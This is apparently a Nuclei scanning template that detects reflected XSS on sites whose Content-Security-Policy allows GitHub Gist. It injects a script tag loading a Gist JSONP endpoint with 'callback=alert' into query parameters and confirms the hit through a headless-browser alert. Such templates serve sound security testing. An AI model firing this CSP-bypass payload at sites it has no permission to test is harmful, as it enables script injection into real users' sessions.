id: gist-github-csp-xss

info:
  name: Content-Security-Policy Bypass via GitHub Gist
  author: renniepak,DhiyaneshDK
  severity: medium
  reference:
    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  metadata:
    verified: true
  tags: xss,csp-bypass,github

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'

    payloads:
      injection:
        - '<script src="https://gist.github.com/renniepak/e7afcd7e727e1a0c481d955ba10441a9.json?callback=alert"></script>'

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{url_encode(injection)}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{injection}}"
        internal: true

headless:
  - steps:
      - action: navigate
        args:
          url: "{{RootURL}}{{trim_prefix(http_matched, RootURL)}}"

      - action: waitload

      - action: waitdialog
        name: gist_github_csp_xss
        args:
          type: alert
          timeout: 5000

    matchers:
      - type: dsl
        dsl:
          - "gist_github_csp_xss == true" 